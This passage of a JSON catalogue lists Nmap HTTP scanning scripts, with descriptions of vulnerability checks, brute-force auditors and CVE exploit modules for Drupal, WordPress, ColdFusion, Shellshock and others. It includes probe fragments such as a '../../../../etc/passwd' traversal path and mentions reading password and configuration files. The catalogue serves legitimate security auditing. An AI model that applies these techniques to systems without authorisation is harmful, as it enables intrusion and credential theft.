    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-mobileversion-checker.nse",
    "description": "Checks if the website holds a mobile version.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-ntlm-info.nse",
    "description": "This script enumerates information from remote HTTP services with NTLM\nauthentication enabled.\n\nBy sending a HTTP NTLM authentication request with null domain and user\ncredentials (passed in the 'Authorization' header), the remote service will\nrespond with a NTLMSSP message (encoded within the 'WWW-Authenticate' header)\nand disclose information to include NetBIOS, DNS, and OS build version if\navailable.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-open-proxy.nse",
    "description": "Checks if an HTTP proxy is open.\n\nThe script attempts to connect to www.google.com through the proxy and\nchecks for a valid HTTP response code. Valid HTTP response codes are\n200, 301, and 302. If the target is an open proxy, this script causes\nthe target to retrieve a web page from www.google.com.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-open-redirect.nse",
    "description": "Spiders a website and attempts to identify open redirects. Open\nredirects are handlers which commonly take a URL as a parameter and\nresponds with a HTTP redirect (3XX) to the target.  Risks of open redirects are\ndescribed at http://cwe.mitre.org/data/definitions/601.html.\n\nOnly open redirects that are directly linked on the target website can be\ndiscovered this way. If an open redirector is not linked, it will not be\ndiscovered.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-passwd.nse",
    "description": "Checks if a web server is vulnerable to directory traversal by attempting to\nretrieve <code>/etc/passwd</code> or <code>\\boot.ini</code>.\n\nThe script uses several technique:\n* Generic directory traversal by requesting paths like <code>../../../../etc/passwd</code>.\n* Known specific traversals of several web servers.\n* Query string traversal. This sends traversals as query string parameters to paths that look like they refer to a local file name. The potential query is searched for in at the path controlled by the script argument <code>http-passwd.root</code>.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-php-version.nse",
    "description": "Attempts to retrieve the PHP version from a web server. PHP has a number\nof magic queries that return images or text that can vary with the PHP\nversion. This script uses the following queries:\n* <code>/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42</code>: gets a GIF logo, which changes on April Fool's Day.\n* <code>/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000</code>: gets an HTML credits page.\n\nA list of magic queries is at http://www.0php.com/php_easter_egg.php.\nThe script also checks if any header field value starts with\n<code>\"PHP\"</code> and reports that value if found.\n\nPHP versions after 5.5.0 do not respond to these queries.\n\nLink:\n* http://phpsadness.com/sad/11",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-phpmyadmin-dir-traversal.nse",
    "description": "Exploits a directory traversal vulnerability in phpMyAdmin 2.6.4-pl1 (and\npossibly other versions) to retrieve remote files on the web server.\n\nReference:\n* http://www.exploit-db.com/exploits/1244/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-phpself-xss.nse",
    "description": "No description available",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-proxy-brute.nse",
    "description": "Performs brute force password guessing against HTTP proxy servers.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-put.nse",
    "description": "Uploads a local file to a remote web server using the HTTP PUT method. You must specify the filename and URL path with NSE arguments.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-qnap-nas-info.nse",
    "description": "Attempts to retrieve the model, firmware version, and enabled services from a\nQNAP Network Attached Storage (NAS) device.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-referer-checker.nse",
    "description": "Informs about cross-domain include of scripts. Websites that include\nexternal javascript scripts are delegating part of their security to\nthird-party entities.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-rfi-spider.nse",
    "description": "Crawls webservers in search of RFI (remote file inclusion) vulnerabilities. It\ntests every form field it finds and every parameter of a URL containing a\nquery.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-robots.txt.nse",
    "description": "Checks for disallowed entries in <code>/robots.txt</code> on a web server.\n\nThe higher the verbosity or debug level, the more disallowed entries are shown.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-robtex-reverse-ip.nse",
    "description": "Obtains up to 100 forward DNS names for a target IP address by querying the Robtex service (https://www.robtex.com/ip-lookup/).\n\n*TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-robtex-shared-ns.nse",
    "description": "Finds up to 100 domain names which use the same name server as the target by querying the Robtex service at http://www.robtex.com/dns/.\n\nThe target must be specified by DNS name, not IP address.\n\n*TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-sap-netweaver-leak.nse",
    "description": "Detects SAP Netweaver Portal instances that allow anonymous access to the\n KM unit navigation page. This page leaks file names, ldap users, etc.\n\nSAP Netweaver Portal with the Knowledge Management Unit enable allows unauthenticated\nusers to list file system directories through the URL '/irj/go/km/navigation?Uri=/'.\n\nThis issue has been reported and won't be fixed.\n\nReferences:\n* https://help.sap.com/saphelp_nw73ehp1/helpdata/en/4a/5c004250995a6ae10000000a42189b/frameset.htm",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-security-headers.nse",
    "description": "Checks for the HTTP response headers related to security given in OWASP Secure Headers Project\nand gives a brief description of the header and its configuration value.\n\nThe script requests the server for the header with http.head and parses it to list headers founds with their\nconfigurations. The script checks for HSTS(HTTP Strict Transport Security), HPKP(HTTP Public Key Pins),\nX-Frame-Options, X-XSS-Protection, X-Content-Type-Options, Content-Security-Policy,\nX-Permitted-Cross-Domain-Policies, Set-Cookie, Expect-CT, Cache-Control, Pragma and Expires.\n\nReferences: https://www.owasp.org/index.php/OWASP_Secure_Headers_Project\nhttps://developer.mozilla.org/en-US/docs/Web/HTTP/Headers",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-server-header.nse",
    "description": "Uses the HTTP Server header for missing version info. This is currently\ninfeasible with version probes because of the need to match non-HTTP services\ncorrectly.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-shellshock.nse",
    "description": "Attempts to exploit the \"shellshock\" vulnerability (CVE-2014-6271 and\nCVE-2014-7169) in web applications.\n\nTo detect this vulnerability the script executes a command that prints a random\nstring and then attempts to find it inside the response body. Web apps that\ndon't print back information won't be detected with this method.\n\nBy default the script injects the payload in the HTTP headers User-Agent,\nCookie, and Referer.\n\nVulnerability originally discovered by Stephane Chazelas.\n\nReferences:\n* http://www.openwall.com/lists/oss-security/2014/09/24/10\n* http://seclists.org/oss-sec/2014/q3/685\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169\n* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-sitemap-generator.nse",
    "description": "Spiders a web server and displays its directory structure along with\nnumber and types of files in each folder. Note that files listed as\nhaving an 'Other' extension are ones that have no extension or that\nare a root document.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-slowloris-check.nse",
    "description": "Tests a web server for vulnerability to the Slowloris DoS attack without\nactually launching a DoS attack.\n\nSlowloris was described at Defcon 17 by RSnake\n(see http://ha.ckers.org/slowloris/).\n\nThis script opens two connections to the server, each without the final CRLF.\nAfter 10 seconds, second connection sends additional header. Both connections\nthen wait for server timeout.  If second connection gets a timeout 10 or more\nseconds after the first one, we can conclude that sending additional header\nprolonged its timeout and that the server is vulnerable to slowloris DoS\nattack.\n\nA \"LIKELY VULNERABLE\" result means a server is subject to timeout-extension\nattack, but depending on the http server's architecture and resource limits, a\nfull denial-of-service is not always possible. Complete testing requires\ntriggering the actual DoS condition and measuring server responsiveness.\n\nYou can specify custom http User-agent field with <code>http.useragent</code>\nscript argument.\n\nIdea from Qualys blogpost:\n* https://community.qualys.com/blogs/securitylabs/2011/07/07/identifying-slow-http-attack-vulnerabilities-on-web-applications",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-slowloris.nse",
    "description": "Tests a web server for vulnerability to the Slowloris DoS attack by launching a Slowloris attack.\n\nSlowloris was described at Defcon 17 by RSnake\n(see http://ha.ckers.org/slowloris/).\n\nThis script opens and maintains numerous 'half-HTTP' connections until\nthe server runs out of resources, leading to a denial of service. When\na successful DoS is detected, the script stops the attack and returns\nthese pieces of information (which may be useful to tweak further\nfiltering rules):\n* Time taken until DoS\n* Number of sockets used\n* Number of queries sent\nBy default the script runs for 30 minutes if DoS is not achieved.\n\nPlease note that the number of concurrent connexions must be defined\nwith the <code>--max-parallelism</code> option (default is 20, suggested\nis 400 or more) Also, be advised that in some cases this attack can\nbring the web server down for good, not only while the attack is\nrunning.\n\nAlso, due to OS limitations, the script is unlikely to work\nwhen run from Windows.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-sql-injection.nse",
    "description": "Spiders an HTTP server looking for URLs containing queries vulnerable to an SQL\ninjection attack. It also extracts forms from found websites and tries to identify\nfields that are vulnerable.\n\nThe script spiders an HTTP server looking for URLs containing queries. It then\nproceeds to combine crafted SQL commands with susceptible URLs in order to\nobtain errors. The errors are analysed to see if the URL is vulnerable to\nattack. This uses the most basic form of SQL injection but anything more\ncomplicated is better suited to a standalone tool.\n\nWe may not have access to the target web server's true hostname, which can prevent access to\nvirtually hosted sites.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-stored-xss.nse",
    "description": "Posts specially crafted strings to every form it\nencounters and then searches through the website for those\nstrings to determine whether the payloads were successful.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-svn-enum.nse",
    "description": "Enumerates users of a Subversion repository by examining logs of most recent commits.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-svn-info.nse",
    "description": "Requests information from a Subversion repository.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-title.nse",
    "description": "Shows the title of the default page of a web server.\n\nThe script will follow up to 5 HTTP redirects, using the default rules in the\nhttp library.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-tplink-dir-traversal.nse",
    "description": "Exploits a directory traversal vulnerability existing in several TP-Link\nwireless routers. Attackers may exploit this vulnerability to read any of the\nconfiguration and password files remotely and without authentication.\n\nThis vulnerability was confirmed in models WR740N, WR740ND and WR2543ND but\nthere are several models that use the same HTTP server so I believe they could\nbe vulnerable as well. I appreciate any help confirming the vulnerability in\nother models.\n\nAdvisory:\n* http://websec.ca/advisories/view/path-traversal-vulnerability-tplink-wdr740\n\nOther interesting files:\n* /tmp/topology.cnf (Wireless configuration)\n* /tmp/ath0.ap_bss (Wireless encryption key)",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-trace.nse",
    "description": "Sends an HTTP TRACE request and shows if the method TRACE is enabled. If debug\nis enabled, it returns the header fields that were modified in the response.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-traceroute.nse",
    "description": "Exploits the Max-Forwards HTTP header to detect the presence of reverse proxies.\n\nThe script works by sending HTTP requests with values of the Max-Forwards HTTP\nheader varying from 0 to 2 and checking for any anomalies in certain response\nvalues such as the status code, Server, Content-Type and Content-Length HTTP\nheaders and body values such as the HTML title.\n\nBased on the work of:\n* Nicolas Gregoire (nicolas.gregoire@agarri.fr)\n* Julien Cayssol (tools@aqwz.com)\n\nFor more information, see:\n* http://www.agarri.fr/kom/archives/2011/11/12/traceroute-like_http_scanner/index.html",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-trane-info.nse",
    "description": "Attempts to obtain information from Trane Tracer SC devices. Trane Tracer SC\n is an intelligent field panel for communicating with HVAC equipment controllers\n deployed across several sectors including commercial facilities and others.\n\nThe information is obtained from the web server that exposes sensitive content to\n unauthenticated users.\n\nTested on Trane Tracer SC version 4.40.1211 and below.\n\nReferences:\n* http://websec.mx/publicacion/blog/Scripts-de-Nmap-para-Trane-Tracer-SC-HVAC",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-unsafe-output-escaping.nse",
    "description": "Spiders a website and attempts to identify output escaping problems\nwhere content is reflected back to the user.  This script locates all\nparameters, ?x=foo&y=bar and checks if the values are reflected on the\npage. If they are indeed reflected, the script will try to insert\nghz>hzx\"zxc'xcv and check which (if any) characters were reflected\nback onto the page without proper html escaping.  This is an\nindication of potential XSS vulnerability.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-useragent-tester.nse",
    "description": "Checks if various crawling utilities are allowed by the host.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-userdir-enum.nse",
    "description": "Attempts to enumerate valid usernames on web servers running with the mod_userdir\nmodule or similar enabled.\n\nThe Apache mod_userdir module allows user-specific directories to be accessed\nusing the http://example.com/~user/ syntax.  This script makes http requests in\norder to discover valid user-specific directories and infer valid usernames.  By\ndefault, the script will use Nmap's\n<code>nselib/data/usernames.lst</code>.  An HTTP response\nstatus of 200 or 403 means the username is likely a valid one and the username\nwill be output in the script results along with the status code (in parentheses).\n\nThis script makes an attempt to avoid false positives by requesting a directory\nwhich is unlikely to exist.  If the server responds with 200 or 403 then the\nscript will not continue testing it.\n\nCVE-2001-1013: http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2001-1013.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vhosts.nse",
    "description": "Searches for web virtual hostnames by making a large number of HEAD requests against http servers using common hostnames.\n\nEach HEAD request provides a different\n<code>Host</code> header. The hostnames come from a built-in default\nlist. Shows the names that return a document. Also shows the location of\nredirections.\n\nThe domain can be given as the <code>http-vhosts.domain</code> argument or\ndeduced from the target's name. For example when scanning www.example.com,\nvarious names of the form <name>.example.com are tried.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-virustotal.nse",
    "description": "Checks whether a file has been determined as malware by Virustotal. Virustotal\nis a service that provides the capability to scan a file or check a checksum\nagainst a number of the major antivirus vendors. The script uses the public\nAPI which requires a valid API key and has a limit on 4 queries per minute.\nA key can be acquired by registering as a user on the virustotal web page:\n* http://www.virustotal.com\n\nThe scripts supports both sending a file to the server for analysis or\nchecking whether a checksum (supplied as an argument or calculated from a\nlocal file) was previously discovered as malware.\n\nAs uploaded files are queued for analysis, this mode simply returns a URL\nwhere status of the queued file may be checked.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vlcstreamer-ls.nse",
    "description": "Connects to a VLC Streamer helper service and lists directory contents. The\nVLC Streamer helper service is used by the iOS VLC Streamer application to\nenable streaming of multimedia content from the remote server to the device.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vmware-path-vuln.nse",
    "description": "Checks for a path-traversal vulnerability in VMWare ESX, ESXi, and Server (CVE-2009-3733).\n\nThe vulnerability was originally released by Justin Morehouse and Tony Flick, who presented at Shmoocon 2010 (http://fyrmassociates.com/tools.html).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2006-3392.nse",
    "description": "Exploits a file disclosure vulnerability in Webmin (CVE-2006-3392)\n\nWebmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML.\nThis allows arbitrary files to be read, without requiring authentication, using \"..%01\" sequences\nto bypass the removal of \"../\" directory traversal sequences.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2009-3960.nse",
    "description": "Exploits cve-2009-3960 also known as Adobe XML External Entity Injection.\n\nThis vulnerability permits to read local files remotely and is present in\nBlazeDS 3.2 and earlier, LiveCycle 8.0.1, 8.2.1, and 9.0,  LiveCycle Data\nServices 2.5.1, 2.6.1, and 3.0, Flex Data Services 2.0.1, and\nColdFusion 7.0.2, 8.0, 8.0.1, and 9.0\n\nFor more information see:\n* http://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf\n* https://www.securityfocus.com/bid/38197\n* Metasploit module: auxiliary/scanner/http/adobe_xml_inject",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2010-0738.nse",
    "description": "Tests whether a JBoss target is vulnerable to jmx console authentication bypass (CVE-2010-0738).\n\nIt works by checking if the target paths require authentication or redirect to a login page that could be\nbypassed via a HEAD request. RFC 2616 specifies that the HEAD request should be treated exactly like GET but\nwith no returned response body. The script also detects if the URL does not require authentication at all.\n\nFor more information, see:\n* CVE-2010-0738 http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0738\n* http://www.imperva.com/resources/glossary/http_verb_tampering.html\n* https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2010-2861.nse",
    "description": "Executes a directory traversal attack against a ColdFusion\nserver and tries to grab the password hash for the administrator user. It\nthen uses the salt value (hidden in the web page) to create the SHA1\nHMAC hash that the web server needs for authentication as admin. You can\npass this value to the ColdFusion server as the admin without cracking\nthe password hash.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2011-3192.nse",
    "description": "Detects a denial of service vulnerability in the way the Apache web server\nhandles requests for multiple overlapping/simple ranges of a page.\n\nReferences:\n* https://seclists.org/fulldisclosure/2011/Aug/175\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192\n* https://www.tenable.com/plugins/nessus/55976",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2011-3368.nse",
    "description": "Tests for the CVE-2011-3368 (Reverse Proxy Bypass) vulnerability in Apache HTTP server's reverse proxy mode.\nThe script will run 3 tests:\n* the loopback test, with 3 payloads to handle different rewrite rules\n* the internal hosts test. According to Contextis, we expect a delay before a server error.\n* The external website test. This does not mean that you can reach a LAN ip, but this is a relevant issue anyway.\n\nReferences:\n* http://www.contextis.com/research/blog/reverseproxybypass/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2012-1823.nse",
    "description": "Detects PHP-CGI installations that are vulnerable to CVE-2012-1823, This\ncritical vulnerability allows attackers to retrieve source code and execute\ncode remotely.\n\nThe script works by appending \"?-s\" to the uri to make vulnerable php-cgi\nhandlers return colour syntax highlighted source. We use the pattern \"<span\nstyle=.*>&lt;?\" to detect\nvulnerable installations.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2013-0156.nse",
    "description": "Detects Ruby on Rails servers vulnerable to object injection, remote command\nexecutions and denial of service attacks. (CVE-2013-0156)\n\nAll Ruby on Rails versions before 2.3.15, 3.0.x before 3.0.19, 3.1.x before\n3.1.10, and 3.2.x before 3.2.11 are vulnerable. This script sends 3 harmless\nYAML payloads to detect vulnerable installations. If the malformed object\nreceives a status 500 response, the server is processing YAML objects and\ntherefore is likely vulnerable.\n\nReferences:\n* https://community.rapid7.com/community/metasploit/blog/2013/01/10/exploiting-ruby-on-rails-with-metasploit-cve-2013-0156',\n* https://groups.google.com/forum/?fromgroups=#!msg/rubyonrails-security/61bkgvnSGTQ/nehwjA8tQ8EJ',\n* http://cvedetails.com/cve/2013-0156/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2013-6786.nse",
    "description": "Detects a URL redirection and reflected XSS vulnerability in Allegro RomPager\nWeb server. The vulnerability has been assigned CVE-2013-6786.\n\nThe check is general enough (script tag injection via Referer header) that some\nother software may be vulnerable in the same way.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2013-7091.nse",
    "description": "An 0 day was released on the 6th December 2013 by rubina119, and was patched in Zimbra 7.2.6.\n\nThe vulnerability is a local file inclusion that can retrieve any file from the server.\n\nCurrently, we read /etc/passwd and /dev/null, and compare the lengths to determine vulnerability.\n\nTODO:\nAdd the possibility to read compressed file.\nThen, send some payload to create the new mail account.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2014-2126.nse",
    "description": "Detects whether the Cisco ASA appliance is vulnerable to the Cisco ASA ASDM\nPrivilege Escalation Vulnerability (CVE-2014-2126).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2014-2127.nse",
    "description": "Detects whether the Cisco ASA appliance is vulnerable to the Cisco ASA SSL VPN\nPrivilege Escalation Vulnerability (CVE-2014-2127).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2014-2128.nse",
    "description": "Detects whether the Cisco ASA appliance is vulnerable to the Cisco ASA SSL VPN\nAuthentication Bypass Vulnerability (CVE-2014-2128).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2014-2129.nse",
    "description": "Detects whether the Cisco ASA appliance is vulnerable to the Cisco ASA SIP\nDenial of Service Vulnerability (CVE-2014-2129).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2014-3704.nse",
    "description": "Exploits CVE-2014-3704 also known as 'Drupageddon' in Drupal. Versions < 7.32\nof Drupal core are known to be affected.\n\nVulnerability allows remote attackers to conduct SQL injection attacks via an\narray containing crafted keys.\n\nThe script injects new Drupal administrator user via login form and then it\nattempts to log in as this user to determine if target is vulnerable. If that's\nthe case following exploitation steps are performed:\n\n* PHP filter module which allows embedded PHP code/snippets to be evaluated is enabled,\n* permission to use PHP code for administrator users is set,\n* new article which contains payload is created & previewed,\n* cleanup: by default all DB records that were added/modified by the script are restored.\n\nVulnerability originally discovered by Stefan Horst from SektionEins.\n\nExploitation technique used to achieve RCE on the target is based on exploit/multi/http/drupal_drupageddon Metasploit module.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2014-8877.nse",
    "description": "Exploits a remote code injection vulnerability (CVE-2014-8877) in Wordpress CM\nDownload Manager plugin. Versions <= 2.0.0 are known to be affected.\n\nCM Download Manager plugin does not correctly sanitise the user input which\nallows remote attackers to execute arbitrary PHP code via the CMDsearch\nparameter to cmdownloads/, which is processed by the PHP 'create_function'\nfunction.\n\nThe script injects PHP system() function into the vulnerable target in order to\nexecute specified shell command.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2015-1427.nse",
    "description": "This script attempts to detect a vulnerability, CVE-2015-1427, which  allows attackers\n to leverage features of this API to gain unauthenticated remote code execution (RCE).\n\n Elasticsearch versions 1.3.0-1.3.7 and 1.4.0-1.4.2 have a vulnerability in the Groovy scripting engine.\n The vulnerability allows an attacker to construct Groovy scripts that escape the sandbox and execute shell\n commands as the user running the Elasticsearch Java VM.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2015-1635.nse",
    "description": "Checks for a remote code execution vulnerability (MS15-034) in Microsoft Windows systems (CVE2015-2015-1635).\n\nThe script sends a specially crafted HTTP request with no impact on the system to detect this vulnerability.\nThe affected versions are Windows 7, Windows Server 2008 R2, Windows 8, Windows Server 2012, Windows 8.1,\nand Windows Server 2012 R2.\n\nReferences:\n* https://technet.microsoft.com/library/security/MS15-034",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2017-1001000.nse",
    "description": "Attempts to detect a privilege escalation vulnerability in Wordpress 4.7.0 and 4.7.1 that\nallows unauthenticated users to inject content in posts.\n\nThe script connects to the Wordpress REST API to obtain the list of published posts and\ngrabs the user id and date from there. Then it attempts to update the date field in the\npost with the same date information we just obtained. If the request doesn’t return an\nerror, we mark the server as vulnerable.\n\nReferences:\nhttps://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2017-5638.nse",
    "description": "Detects whether the specified URL is vulnerable to the Apache Struts\nRemote Code Execution Vulnerability (CVE-2017-5638).",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2017-5689.nse",
    "description": "Detects if a system with Intel Active Management Technology is vulnerable to the INTEL-SA-00075\nprivilege escalation vulnerability (CVE2017-5689).\n\nThis script determines if a target is vulnerable by attempting to perform digest authentication\nwith a blank response parameter. If the authentication succeeds, a HTTP 200 response is received.\n\nReferences:\n* https://www.tenable.com/blog/rediscovering-the-intel-amt-vulnerability",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-cve2017-8917.nse",
    "description": "An SQL Injection vulnerability affecting Joomla! 3.7.x before 3.7.1 allows for\nunauthenticated users to execute arbitrary SQL commands. This vulnerability was\ncaused by a new component, <code>com_fields</code>, which was introduced in\nversion 3.7. This component is publicly accessible, which means this can be\nexploited by any malicious individual visiting the site.\n\nThe script attempts to inject an SQL statement that runs the <code>user()</code>\ninformation function on the target website. A successful injection will return\nthe current MySQL user name and host name in the extra_info table.\n\nThis script is based on a Python script written by brianwrf.\n\nReferences:\n* https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html\n* https://github.com/brianwrf/Joomla3.7-SQLi-CVE-2017-8917",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-misfortune-cookie.nse",
    "description": "Detects the RomPager 4.07 Misfortune Cookie vulnerability by safely exploiting it.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-vuln-wnr1000-creds.nse",
    "description": "A vulnerability has been discovered in WNR 1000 series that allows an attacker\nto retrieve administrator credentials with the router interface.\nTested On Firmware Version(s): V1.0.2.60_60.0.86 (Latest) and V1.0.2.54_60.0.82NA\n\nVulnerability discovered by c1ph04.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-waf-detect.nse",
    "description": "Attempts to determine whether a web server is protected by an IPS (Intrusion\nPrevention System), IDS (Intrusion Detection System) or WAF (Web Application\nFirewall) by probing the web server with malicious payloads and detecting\nchanges in the response code and body.\n\nTo do this the script will send a \"good\" request and record the response,\nafterwards it will match this response against new requests containing\nmalicious payloads. In theory, web applications shouldn't react to malicious\nrequests because we are storing the payloads in a variable that is not used by\nthe script/file and only WAF/IDS/IPS should react to it.  If aggro mode is set,\nthe script will try all attack vectors (More noisy)\n\nThis script can detect numerous IDS, IPS, and WAF products since they often\nprotect web applications in the same way.  But it won't detect products which\ndon't alter the http traffic.  Results can vary based on product configuration,\nbut this script has been tested to work against various configurations of the\nfollowing products:\n\n* Apache ModSecurity\n* Barracuda Web Application Firewall\n* PHPIDS\n* dotDefender\n* Imperva Web Firewall\n* Blue Coat SG 400",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-waf-fingerprint.nse",
    "description": "Tries to detect the presence of a web application firewall and its type and\nversion.\n\nThis works by sending a number of requests and looking in the responses for\nknown behavior and fingerprints such as Server header, cookies and headers\nvalues. Intensive mode works by sending additional WAF specific requests to\ndetect certain behaviour.\n\nCredit to wafw00f and w3af for some fingerprints.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-webdav-scan.nse",
    "description": "A script to detect WebDAV installations. Uses the OPTIONS and PROPFIND methods.\n\nThe script sends an OPTIONS request which lists the dav type, server type, date\nand allowed methods. It then sends a PROPFIND request and tries to fetch exposed\ndirectories and internal ip addresses by doing pattern matching in the response body.\n\nThis script takes inspiration from the various scripts listed here:\n* http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html\n* https://github.com/sussurro/Metasploit-Tools/blob/master/modules/auxiliary/scanner/http/webdav_test.rb\n* http://code.google.com/p/davtest/",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-wordpress-brute.nse",
    "description": "performs brute force password auditing against Wordpress CMS/blog installations.\n\nThis script uses the unpwdb and brute libraries to perform password guessing. Any successful guesses are\nstored using the credentials library.\n\nWordpress default uri and form names:\n* Default uri:<code>wp-login.php</code>\n* Default uservar: <code>log</code>\n* Default passvar: <code>pwd</code>",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-wordpress-enum.nse",
    "description": "Enumerates themes and plugins of Wordpress installations. The script can also detect\n outdated plugins by comparing version numbers with information pulled from api.wordpress.org.\n\nThe script works with two separate databases for themes (wp-themes.lst) and plugins (wp-plugins.lst).\nThe databases are sorted by popularity and the script will search only the top 100 entries by default.\nThe theme database has around 32,000 entries while the plugin database has around 14,000 entries.\n\nThe script determines the version number of a plugin by looking at the readme.txt file inside the plugin\ndirectory and it uses the file style.css inside a theme directory to determine the theme version.\nIf the script argument check-latest is set to true, the script will query api.wordpress.org to obtain\nthe latest version number available. This check is disabled by default since it queries an external service.\n\nThis script is a combination of http-wordpress-plugins.nse and http-wordpress-themes.nse originally\nsubmited by Ange Gutek and Peter Hill.\n\nTODO:\n-Implement version checking for themes.",
    "source": "External",
    "url": "https://github.com/nmap/nmap"
  },
  {
    "name": "http-wordpress-users.nse",
